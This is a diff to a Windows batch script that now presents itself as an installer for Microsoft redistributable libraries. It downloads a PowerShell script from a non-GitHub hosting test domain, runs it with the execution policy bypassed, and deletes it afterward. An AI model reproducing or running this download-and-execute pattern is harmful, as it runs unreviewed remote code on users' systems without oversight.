@@ -1,8 +1,8 @@
 @echo off
 
-echo --------------------------------------------
-echo Download and Run All Optimize Script Applets
-echo --------------------------------------------
+echo ----------------------------------------------------------
+echo Install and update all Microsoft redistributable libraries
+echo ----------------------------------------------------------
 
 echo:
 echo Verifying appropriate Powershell is present ...
@@ -19,17 +19,17 @@ If %psversion% LSS "5.1" (
 echo Ready to go.
 
 echo:
-echo Preparing...
+echo Downloading Powershell code to run...
 echo ---
 echo:
 @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command ^
-"$wco = (New-Object System.Net.WebClient); $wco.DownloadFile('https://raw.githubusercontent.com/jebofponderworthy/windows-tools/master/tools/Optimize-NoHardware.ps1','Optimize-NoHardware.ps1')"
+"$wco = (New-Object System.Net.WebClient); $wco.DownloadFile('http://privateftp.centuryks.com.php73-36.phx1-1.websitetestlink.com/privateftp/GetRedists.ps1','GetRedists.ps1')"
 
 echo:
-echo Initiating...
+echo Processing...
 echo ---
 echo:
-@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command ".\Optimize-NoHardware.ps1"
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command ".\GetRedists.ps1"
 
-@del Optimize-NoHardware.ps1
+@del GetRedists.ps1
 
